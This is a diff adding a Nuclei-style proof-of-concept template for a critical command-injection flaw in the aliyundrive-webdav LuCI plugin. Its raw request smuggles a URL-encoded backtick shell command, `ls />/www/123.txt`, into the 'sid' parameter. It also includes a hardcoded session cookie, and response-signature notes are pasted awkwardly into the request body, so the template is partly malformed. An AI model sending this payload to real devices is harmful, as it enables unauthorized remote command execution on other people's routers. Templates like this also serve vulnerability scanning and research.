@@ -1,0 +1,49 @@
+id: poc-hl0bfzdtfc9uu2vq
+info:
+  name: aliyundrive-webdav 命令注入漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hl0bfzdtfc9uu2vq'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: hl0bfzdtfc9uu2vq
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /cgi-bin/luci/admin/services/aliyundrive-webdav/query?sid=%60%6c%73%20%2f%3e%2f%77%77%77%2f%31%32%33%2e%74%78%74%60 HTTP/1.1
+
+
+    Cookie: sysauth=41273cb2cffef0bb5d0653592624cf64
+
+
+    Accept: */*
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
+
+
+    Connection: close
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    token
+
+
+    # 上传文件定位
+
+    /123.txt'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
